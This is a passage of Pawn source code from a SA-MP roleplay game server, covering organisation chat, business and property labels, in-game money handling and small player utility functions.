    else if( IsPlayerInRangeOfPoint( playerid, 4, -2039.85,-398.336,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2011.14,-398.336,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -1980.79,142.664,27.0703 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2319.99,2532.85,10.2188 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1520.15,1055.27,10.00 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2503.14,1243.7,10.2188 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2085.77,2071.36,10.4531 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -862.828,1536.61,21.9844 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -14.7031,1175.36,18.9531 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -253.742,2597.95,62.2422 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 201.016,-107.617,0.898438 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1277.84,372.516,18.9531 ) ) return 1;
    else return(false);
}
//------------------------------------------------------------------------------
OrgPoruka(orgid, color, const text[], {Float,_}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 3)
	{
	    foreach( new i : Player)
		{
		    if( PlayerInfo[ i ][ xClan ] == orgid || PlayerInfo[ i ][ xLider ] == orgid || UKLJUCENIFCHAT[ i ] == orgid )
			{
		        if(!ToggedFR[i])
				{
		        	SendClientMessage( i, color, text );
				}
			}
		}
	}
	else
	{
		while(--args >= 3)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 	text
		#emit PUSH.C 	192
		#emit PUSH.C 	str
		#emit PUSH.S	8
		#emit SYSREQ.C 	format
		#emit LCTRL 	5
		#emit SCTRL 	4

		foreach( new i : Player)
		{
		    if( PlayerInfo[ i ][ xClan ] == orgid || PlayerInfo[ i ][ xLider ] == orgid || UKLJUCENIFCHAT[ i ] == orgid )
			{
		        if(!ToggedFR[i])
				{
		        	SendClientMessage( i, color, str );
				}
			}
		}

		#emit RETN
	}
	return 1;
}

OrgPorukaLeader(orgid, color, const text[], {Float,_}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 3)
	{
	   	foreach( new i : Player)
		{
		    if( PlayerInfo[ i ][ xLider ] == orgid )
			{
				SendClientMessage( i, color, text );
			}
		}
	}
	else
	{
		while(--args >= 3)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 	text
		#emit PUSH.C 	192
		#emit PUSH.C 	str
		#emit PUSH.S	8
		#emit SYSREQ.C 	format
		#emit LCTRL 	5
		#emit SCTRL 	4

		foreach( new i : Player)
		{
		    if( PlayerInfo[ i ][ xLider ] == orgid )
			{
				SendClientMessage( i, color, str );
			}
		}

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public GetNearestOrganization( playerid )
{
    for( new b = 0; b < MAX_ORG; b++)
	{
        if( IsPlayerInRangeOfPoint( playerid, 2.0, org_info[ b ][ oPozExtX], org_info[ b ][ oPozExtY], org_info[ b ][ oPozExtZ ] ) ) return b;
	}
    return -1;
}
//------------------------------------------------------------------------------
_:public Bussines_Refresh( b )
{
	new string[ 250 ];
	if( IsValidDynamicPickup( FirmaPickup[ b ] ) ) DestroyDynamicPickup( FirmaPickup[ b ] );
	if( IsValidDynamic3DTextLabel( FirmaLabel[ b ] ) ) DestroyDynamic3DTextLabel( FirmaLabel[ b ] );

	if( BusinessInfo[ b ][ bOwnerOrg ] != -1 )
	{
	    format( string, sizeof( string ),
											"(FIRMA - [%d])\n\
											Ime: {FFFFFF}%s\n\
											{B72C40}Vlasnik: {FFFFFF}%s\n\
											{B72C40}Vrsta: {FFFFFF}%s\n\
											{B72C40}Adresa: {FFFFFF}%s",
																			b,
																			BusinessInfo[ b ][ bName ],
																			org_info[ BusinessInfo[ b ][ bOwnerOrg ] ][ oName ],
																			getBussinesType( b ), UliceFirme( b ) );
	}
	else
	{
		if( BusinessInfo[ b ][ bOwner_sqlID ] == -1 )
		{
		    if(!BusinessInfo[b][bOnAuction])
		    {
			    format(string,sizeof(string),
												"(FIRMA - [%d])\n\
												Ime: {FFFFFF}%s\n\
												{B72C40}Cena: {FFFFFF}$%d\n\
												{B72C40}Vrsta: {FFFFFF}%s\n\
												{B72C40}Level: {FFFFFF}%d\n\
												{B72C40}Adresa: {FFFFFF}%s\n\
												{B72C40}[ /kupifirmu ]",
													b, BusinessInfo[ b ][ bName ], BusinessInfo[ b ][ bPrice ], 
													getBussinesType( b ), BusinessInfo[ b ][ bLevel ], UliceFirme( b ) );
			}
			else
		    {
			    format(string,sizeof(string),
													"(FIRMA - [%d])\n\
													Ime: {FFFFFF}%s\n\
													{B72C40}Cena: {FFFFFF}$%d\n\
													{B72C40}Vrsta: {FFFFFF}%s\n\
													{B72C40}Level: {FFFFFF}%d\n\
													{B72C40}Adresa: {FFFFFF}%s\n\
													{B72C40}[ {00FF00}NA AUKCIJI {B72C40}]",
																								b, BusinessInfo[ b ][ bName ], BusinessInfo[ b ][ bPrice ], 
																								getBussinesType( b ), BusinessInfo[ b ][ bLevel ], UliceFirme( b ) );
			}
		}
		else
		{
		    format(string, sizeof(string),
				"(FIRMA - [%d])\n\
				Ime: {FFFFFF}%s\n\
				{B72C40}Vlasnik: {FFFFFF}%s\n\
				{B72C40}Vrsta: {FFFFFF}%s\n\
				{B72C40}Adresa: {FFFFFF}%s\n\
				{B72C40}Neaktivnost: {FFFFFF}%dh\n\
				{B72C40}Fakture: {FFFFFF}%d",
					b,
					BusinessInfo[ b ][ bName ],
					BusinessInfo[ b ][ bOwner ],
					getBussinesType( b ), UliceFirme( b ),
					BusinessInfo[ b ][ bNeaktivnost ], BusinessInfo[ b ][ bFacture ] );
		}
	}

	FirmaLabel[ b ] = CreateDynamic3DTextLabel(string, 0xB72C40FF, BusinessInfo[ b ][ bEnterX ], BusinessInfo[ b ][ bEnterY ], BusinessInfo[ b ][ bEnterZ ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
	FirmaPickup[ b ] = CreateDynamicPickup(1274, 1, BusinessInfo[ b ][ bEnterX ], BusinessInfo[ b ][ bEnterY ], BusinessInfo[ b ][ bEnterZ ], .priority = 26 );

    //FirmaPickup[ b ] = CreateDynamicCP( BusinessInfo[ b ][ bEnterX ], BusinessInfo[ b ][ bEnterY ], BusinessInfo[ b ][ bEnterZ ], 1.5, -1, -1, -1, 30 );
    //FirmaPickup[ b ] = CreateDynamicPickup( 1317, 1, BusinessInfo[ b ][ bEnterX ], BusinessInfo[ b ][ bEnterY ], BusinessInfo[ b ][ bEnterZ ], 0, 0 );
	return 1;
}
//------------------------------------------------------------------------------
getTypePName( type )
{
	new typeName[20] = "Nepostojeca";

	switch( type )
	{
	    case 0: typeName = "Nema";
		case MALA_KUCA: typeName = "Mala kuca";
		case SREDNJA_KUCA: typeName = "Srednja kuca";
		case VELIKA_KUCA: typeName = "Velika kuca";
	}
	return typeName;
}
//------------------------------------------------------------------------------
_:public PropertyRefresh( im )
{
	new string[ 300 ];
    if( im != -1 )
	{
		if( IsValidDynamicPickup( ImovinaPickup[ im ] ) ) DestroyDynamicPickup( ImovinaPickup[ im ] );
		if( IsValidDynamic3DTextLabel( ImovinaLabel[ im ] ) ) DestroyDynamic3DTextLabel( ImovinaLabel[ im ] );

		if( II[ im ][ iUsage ] == IMOVINA_KUCA )
		{
			if( II[ im ][ iOwned ] == 0 )
			{
				if(!II[im][iOnAuction])
				{
					format( string, sizeof( string ),
						"{4282C0}(KUCA - [%d])\n\
						Vrsta: {FFFFFF}%s\n\
						{4282C0}Cena: {FFFFFF}$%d\n\
						{4282C0}Level: {FFFFFF}%d\n\
						{4282C0}Adresa: {FFFFFF}%s\n\
						{4282C0}[ /kupiimovinu ]", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				}
				else
				{
					format( string, sizeof( string ),
						"{4282C0}(KUCA - [%d])\n\
						Vrsta: {FFFFFF}%s\n\
						{4282C0}Cena: {FFFFFF}$%d\n\
						{4282C0}Level: {FFFFFF}%d\n\
						{4282C0}Adresa: {FFFFFF}%s\n\
						{4282C0}[ {00FF00}NA AUKCIJI {4282C0}]", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				}
				ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 )
			{
				format( string, sizeof( string ),
					"{4282C0}(KUCA - [%d])\n\
					Vlasnik: {FFFFFF}%s\n\
					{4282C0}Adresa: {FFFFFF}%s\n\
					{4282C0}Vrsta: {FFFFFF}%s\n\
					{4282C0}Neaktivnost: {FFFFFF}%dh\n\
					{4282C0}'ENTER' za ulaz u imovinu.", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 )
			{
				format( string, sizeof( string ),
					"{4282C0}(KUCA - [%d])\n\
					Vlasnik: {FFFFFF}%s\n\
					{4282C0}Adresa: {FFFFFF}%s\n\
					{4282C0}Vrsta: {FFFFFF}%s\n\
					{4282C0}Neaktivnost: {FFFFFF}%dh\n\
					{4282C0}Cena renta: {FFFFFF}$%d\n\
					{4282C0}[ /rentroom ]", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
		}
		else if( II[ im ][ iUsage ] == IMOVINA_STAN )
		{
			if( II[ im ][ iOwned ] == 0 )
			{
				if(!II[im][iOnAuction])
				{
					format( string, sizeof( string ),
						"{FF0000}(STAN - [%d])\n\
						Cena: {FFFFFF}$%d\n\
						{FF0000}Level: {FFFFFF}%d\n\
						{FF0000}Adresa: {FFFFFF}%s\n\
						{FF0000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				}
				else
				{
					format( string, sizeof( string ),
						"{FF0000}(STAN - [%d])\n\
						Cena: {FFFFFF}$%d\n\
						{FF0000}Level: {FFFFFF}%d\n\
						{FF0000}Adresa: {FFFFFF}%s\n\
						{FF0000}[ {00FF00}NA AUKCIJI {FF0000}]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				}
				ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 )
			{
				format( string, sizeof( string ),
					"{FF0000}(STAN - [%d])\n\
					Vlasnik: {FFFFFF}%s\n\
					{FF0000}Adresa: {FFFFFF}%s\n\
					{FF0000}Neaktivnost: {FFFFFF}%dh\n\
					{FF0000}'ENTER' za ulaz u imovinu.", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 )
			{
				format( string, sizeof( string ),
					"{FF0000}(STAN - [%d])\n\
					Vlasnik: {FFFFFF}%s\n\
					{FF0000}Adresa: {FFFFFF}%s\n\
					{FF0000}Neaktivnost: {FFFFFF}%dh\n\
					{FF0000}Cena renta: {FFFFFF}$%d\n\
					{FF0000}[ /rentroom ]", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
		}
		else if( II[ im ][ iUsage ] == IMOVINA_VIKENDICA )
		{
		    if( II[ im ][ iOwned ] == 0 )
			{
				if(!II[im][iOnAuction])
				{
					format( string, sizeof( string ),
						"{7B8000}(VIKENDICA - [%d])\n\
						Cena: {FFFFFF}$%d\n\
						{7B8000}Level: {FFFFFF}%d\n\
						{7B8000}Adresa: {FFFFFF}%s\n\
						{7B8000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				}
				else
				{
					format( string, sizeof( string ),
						"{7B8000}(VIKENDICA - [%d])\n\
						Cena: {FFFFFF}$%d\n\
						{7B8000}Level: {FFFFFF}%d\n\
						{7B8000}Adresa: {FFFFFF}%s\n\
						{7B8000}[ {00FF00}NA AUKCIJI {FB8000}]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				}
				ImovinaPickup[ im ] = CreateDynamicPickup(1318, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
		    }
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 )
			{
	            format( string, sizeof( string ),
					"{7B8000}(VIKENDICA - [%d])\n\
					Vlasnik: {FFFFFF}%s\n\
					{7B8000}Adresa: {FFFFFF}%s\n\
					{7B8000}Neaktivnost: {FFFFFF}%dh\n\
					{7B8000}'ENTER' za ulaz u imovinu.", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
	        else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 )
			{
	            format( string, sizeof( string ),
					"{7B8000}(VIKENDICA - [%d])\n\
					Vlasnik: {FFFFFF}%s\n\
					{7B8000}Adresa: {FFFFFF}%s\n\
					{7B8000}Neaktivnost: {FFFFFF}%dh\n\
					{7B8000}Cena renta: {FFFFFF}$%d\n\
					{7B8000}[ /rentroom ]", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] , 0, 0, .priority = 26 );
				ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, -1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, 0, 0, .priority = 26 );
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public Orge3D( id )
{
    if( IsValidDynamicMapIcon( org_info[id][oMapIcon] ) ) DestroyDynamicMapIcon( org_info[id][oMapIcon] );
    if( IsValidDynamicPickup( org_info[id][oPickup] ) ) DestroyDynamicPickup( org_info[id][oPickup] );
	if( IsValidDynamic3DTextLabel( org_info[id][o3D] ) ) DestroyDynamic3DTextLabel( org_info[id][o3D] );

	new string[ 200 ];
    format( string, sizeof( string ),
										"Organizacija - ({FFFFFF}%d{FF6200})\n\
										{FFFFFF}%s\n\n\
										{FF6200}Da udjete koristite tipku {FFFFFF}\"ENTER\"", id, org_info[ id ][ oName ] );
    org_info[id][o3D] = CreateDynamic3DTextLabel( string, 0xFF6200FF, org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ], 5.0, IPI, IVI, 0, org_info[ id ][ oEntVw ], org_info[ id ][ oEntInt ], -1, 10.0, .priority = 30);
	org_info[id][oPickup] = CreateDynamicPickup( 1314, 1, org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ], org_info[ id ][ oEntVw ], org_info[ id ][ oEntInt ], .priority = 30 );
	org_info[id][oMapIcon] = CreateDynamicMapIcon(org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ], (org_info[ id ][ oTip ] == ORG_TIP_VLADINA ? 30 : 23), -1, -1, -1, -1, 750.0);

	if( org_info[ id ][ oDutyPoint ][ 0 ] != 0 && org_info[ id ][ oDutyPoint ][ 1 ] != 0 )
	{
	    if( IsValidDynamic3DTextLabel( org_info[id][oDuty3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oDuty3D] );
		if( IsValidDynamicPickup( org_info[id][oDutyPickup] ) ) DestroyDynamicPickup( org_info[id][oDutyPickup] );

        org_info[id][oDuty3D] = CreateDynamic3DTextLabel("Undercover\nDa idete undercover kucajte {FFFFFF}\"/undercover\"\n\n{FF6200}Duty\nDa idete na duznost kucajte {FFFFFF}\"/duty\"", 0xFF6200FF, org_info[ id ][ oDutyPoint ][ 0 ], org_info[ id ][ oDutyPoint ][ 1 ], org_info[ id ][ oDutyPoint ][ 2 ], 5, IPI, IVI, 0, org_info[ id ][ oDutyVW ], org_info[ id ][ oDutyInt ], -1, 20.0);
		org_info[id][oDutyPickup] = CreateDynamicPickup( 1239, 1, org_info[ id ][ oDutyPoint ][ 0 ], org_info[ id ][ oDutyPoint ][ 1 ], org_info[ id ][ oDutyPoint ][ 2 ], org_info[ id ][ oDutyVW ], org_info[ id ][ oDutyInt ], -1, 20.0 );
	}
	if( org_info[ id ][ oDiler ][ 0 ] != 0 && org_info[ id ][ oDiler ][ 1 ] != 0 )
	{
	    if( IsValidDynamicActor( org_info[id][oDilerActor] ) ) DestroyDynamicActor( org_info[id][oDilerActor] );
	    if( IsValidDynamic3DTextLabel( org_info[id][oDiler3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oDiler3D] );

        org_info[id][oDilerActor] = CreateDynamicActor( org_info[ id ][ oSkin1 ], org_info[ id ][ oDiler ][ 0 ], org_info[ id ][ oDiler ][ 1 ], org_info[ id ][ oDiler ][ 2 ], org_info[ id ][ oDiler ][ 3 ], 1, 100.0, -1, -1, -1, 200.0, -1, 0);

		format(string, sizeof(string), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", id, org_info[ id ][ oDilerCena ], org_info[ id ][ oSafeDrugAmmount ], ((org_info[id][oDilerRadi]) ? ("Da") : ("Ne")) );
		org_info[id][oDiler3D] = CreateDynamic3DTextLabel( string, 0x64BC47FF, org_info[ id ][ oDiler ][ 0 ], org_info[ id ][ oDiler ][ 1 ], org_info[ id ][ oDiler ][ 2 ], 5, IPI, IVI, 0, -1, -1, -1, 20.0);
	}
	if( org_info[ id ][ oEquipPoint ][ 0 ] != 0 && org_info[ id ][ oEquipPoint ][ 1 ] != 0 )
	{
	    if( IsValidDynamic3DTextLabel( org_info[id][oEquip3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oEquip3D] );
		if( IsValidDynamicPickup( org_info[id][oEquipPickup] ) ) DestroyDynamicPickup( org_info[id][oEquipPickup] );

        org_info[id][oEquip3D] = CreateDynamic3DTextLabel( "Equipment\nDa uzmete opremu kucajte {FFFFFF}\"/(eq)uipment\"", 0xFF6200FF, org_info[ id ][ oEquipPoint ][ 0 ], org_info[ id ][ oEquipPoint ][ 1 ], org_info[ id ][ oEquipPoint ][ 2 ], 5, IPI, IVI, 0, org_info[ id ][ oEquipVW ], org_info[ id ][ oEquipInt ], -1, 20.0);
		org_info[id][oEquipPickup] = CreateDynamicPickup( 1239, 1, org_info[ id ][ oEquipPoint ][ 0 ], org_info[ id ][ oEquipPoint ][ 1 ], org_info[ id ][ oEquipPoint ][ 2 ], org_info[ id ][ oEquipVW ], org_info[ id ][ oEquipInt ], -1, 20.0 );
	}
	if( org_info[ id ][ oSafePos ][ 0 ] != 0 && org_info[ id ][ oSafePos ][ 1 ] != 0 )
	{
	    if( IsValidDynamic3DTextLabel( org_info[id][oSafe3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oSafe3D] );
		if( IsValidDynamicPickup( org_info[id][oSafePickup] ) ) DestroyDynamicPickup( org_info[id][oSafePickup] );

	    org_info[id][oSafe3D] = CreateDynamic3DTextLabel( "Sef\nDa koristite sef organizacije kucajte {FFFFFF}\"/orgsef\"", 0xFF6200FF, org_info[ id ][ oSafePos ][ 0 ], org_info[ id ][ oSafePos ][ 1 ], org_info[ id ][ oSafePos ][ 2 ], 5, IPI, IVI, 0, org_info[ id ][ oVw ], org_info[ id ][ oInt ], -1, 20.0);
		org_info[id][oSafePickup] = CreateDynamicPickup( 1239, 1, org_info[ id ][ oSafePos ][ 0 ], org_info[ id ][ oSafePos ][ 1 ], org_info[ id ][ oSafePos ][ 2 ], org_info[ id ][ oVw ], org_info[ id ][ oInt ], -1, 20.0 );
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public DodajIgracuHP(playerid, value)
{
	new Float:Health;
	GetPlayerHealth( playerid, Health );
	SetPlayerHealth( playerid, Health+value );
}
//------------------------------------------------------------------------------
_:public DodajIgracuArmour(playerid, value)
{
  	new Float:Armour;
  	GetPlayerArmour( playerid, Armour );
  	SetPlayerArmour( playerid, Armour+value );
}
//------------------------------------------------------------------------------
PocetniNovac( playerid, novac )
{
	new Strg[ 15 ];
 	format( Strg, sizeof( Strg ), "~g~$%d", novac );
 	GameTextForPlayer( playerid, Strg, 5000, 1 );

	PlayerInfo[ playerid ][ xNovac ] = novac;
	ResetPlayerMoney( playerid );
	GivePlayerMoney( playerid, PlayerInfo[ playerid  ][ xNovac ] );
	return PlayerInfo[ playerid ][ xNovac ];
}
//------------------------------------------------------------------------------
_:public BussinesMoney( bussinesID, ammount, bool:procenti)
{
    if( bussinesID == -1 ) return 1;
	if( ammount < 0 || ammount > 999999 ) return 1;
	if( BusinessInfo[ bussinesID ][ bOwner_sqlID ] == -1 ) return 1;
	
	if(procenti == true) 
	{
		new x;
    	x = FIRMA_ZARADA * ammount / 100;

		BusinessInfo[ bussinesID ][ bMoney ] += x;
   		sql_bussines_update_integer( bussinesID, "b_money", BusinessInfo[ bussinesID ][ bMoney ] );
	}
	else 
	{
		BusinessInfo[ bussinesID ][ bMoney ] += ammount;
   		sql_bussines_update_integer( bussinesID, "b_money", BusinessInfo[ bussinesID ][ bMoney ] );
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public BussinesTrafikaMoney( playerid, ammount )
{
    new bussinesID = -1;

    new Float:Pos[3];
    GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

    foreach(new i : iter_Bizz)
    {
        if( BusinessInfo[ i ][ bType ] == VRSTA_TRAFIKA && IsPlayerInRangeOfPoint(playerid, 15.0, BusinessInfo[i][bEnterX], BusinessInfo[i][bEnterY], BusinessInfo[i][bEnterZ]))
        {
            bussinesID = i;
            break;
        }
    }

    if( bussinesID == -1 ) return 1;
    BussinesMoney( bussinesID, ammount, true );
    return 1;
}
//------------------------------------------------------------------------------
_:public BussinesOglasMoney( ammount )
{
	new bussinesID = -1;

    foreach(new i : iter_Bizz)
	{
		if( BusinessInfo[ i ][ bType ] == VRSTA_OGLAS )
		{
			bussinesID = i;
		    break;
		}
	}

	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount, true );
	return 1;
}
//------------------------------------------------------------------------------
_:public BussinesLutrijaMoney( ammount )
{
	new bussinesID = -1;

    foreach(new i : iter_Bizz)
	{
		if( BusinessInfo[ i ][ bType ] == VRSTA_LUTRIJA )
		{
			bussinesID = i;
		    break;
		}
	}

	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount, true );
	return 1;
}
//------------------------------------------------------------------------------
_:public BussinesJobMoney( jobID, ammount )
{
	new bussinesID = -1;
    foreach(new i : iter_Bizz)
	{
		if( BusinessInfo[ i ][ bType ] == VRSTA_POSAO )
		{
		    if( BusinessInfo[ i ][ bJobID ] == jobID )
			{
		        bussinesID = i;
		        break;
		    }
		}
	}
	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount, true );
	return 1;
}
//------------------------------------------------------------------------------
_:public BussinesRentMoney( playerid, ammount )
{
	new bussinesID = -1;
    foreach(new i : iter_Bizz)
	{
		if( BusinessInfo[ i ][ bType ] == VRSTA_RENT )
		{
			bussinesID = i;
			break;
		}
	}
	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount, true );
	return 1;
}
//------------------------------------------------------------------------------
_:public BussinesJavnaKucaMoney( playerid, ammount )
{
	new bussinesID = -1;

    if( uFirmi[ playerid ] != -1 )
	{
		if( BusinessInfo[ uFirmi[ playerid ] ][ bType ] == VRSTA_JAVNAK )
		{
			bussinesID = uFirmi[ playerid ];
		}
	}

	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount, true );
	return 1;
}

_:public PostaviIgracuSkin( playerid, skin )
{
    PlayerInfo[ playerid ][ xSkin ] = skin;
	sql_user_update_integer( playerid, "skin_id", PlayerInfo[ playerid ][ xSkin ] );

	return PlayerInfo[ playerid ][ xSkin ];
}

_:public DajIgracuNovac( playerid, novac )
{
	PlayerInfo[ playerid ][ xNovac ] += novac;
	ResetPlayerMoney( playerid );
	GivePlayerMoney( playerid, PlayerInfo[ playerid ][ xNovac ] );
	sql_user_update_integer( playerid, "money", PlayerInfo[ playerid ][ xNovac ] );

	return PlayerInfo[ playerid ][ xNovac ];
}
//------------------------------------------------------------------------------
_:public ForbiddenWeap( playerid )
{
    new weap = GetPlayerWeapon(playerid);
    if( weap == 35 || weap == 36 || weap == 37 || weap == 38 || weap == 39 || weap == 40 || weap == 42 || weap == 44 || weap == 45)
	{
		return 1;
    }
    return(false);
}
//------------------------------------------------------------------------------
_:public IsRpNickname(nickname[])
{
    new Regex:r = Regex_New("^([A-Z][a-z]+_[A-Z][a-z]+)$");
    new check = Regex_Check(nickname, r);
    Regex_Delete(r);
    return check;
}
//------------------------------------------------------------------------------
fNumber(number, const separator[] = ".")
{
	new output[15];
	format(output, sizeof(output), "%d", number);
 
	for(new i = strlen(output) - 3; i > 0 && output[i-1] != '-'; i -= 3)
	{
		strins(output, separator, i);
	}
	return output;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
main( ) { }
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

_:public StartKladRulet()
{
	new randomtekma = random(10),
		randomruletid = random(37);

	foreach(new playerid : Player)
	{
		if(Kockanje[playerid][IgraKlad])
		{
	    	switch(randomtekma)
	    	{
